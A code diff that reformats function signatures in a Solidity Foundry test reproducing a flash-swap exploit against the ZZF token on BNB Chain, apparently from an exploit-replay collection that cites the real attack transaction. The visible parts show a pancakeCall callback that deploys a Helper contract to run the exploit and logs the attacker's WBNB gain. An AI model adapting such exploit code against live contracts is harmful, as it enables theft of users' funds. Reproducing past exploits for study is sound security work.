@@ -11,10 +11,12 @@ import "./../interface.sol";
 // Attack txs : https://app.blocksec.com/explorer/tx/bsc/0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f
 
 // @Analysis
- 
 
 interface IZZF is IERC20 {
-    function burnToHolder(uint256 amount, address _invitation) external;
+    function burnToHolder(
+        uint256 amount,
+        address _invitation
+    ) external;
 
     function receiveRewards(
         address to
@@ -52,7 +54,12 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("Exploiter WBNB balance after attack", WBNB.balanceOf(address(this)), 18);
     }
 
-    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
+    function pancakeCall(
+        address _sender,
+        uint256 _amount0,
+        uint256 _amount1,
+        bytes calldata _data
+    ) external {
         Helper helper = new Helper();
         WBNB.transfer(address(helper), _amount1);
         helper.exploit();
@@ -101,7 +108,11 @@ contract Helper {
         WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
     }
 
-    function makeSwap(uint256 amountIn, address tokenA, address tokenB) private {
+    function makeSwap(
+        uint256 amountIn,
+        address tokenA,
+        address tokenB
+    ) private {
         address[] memory path = new address[](2);
         path[0] = tokenA;
         path[1] = tokenB;
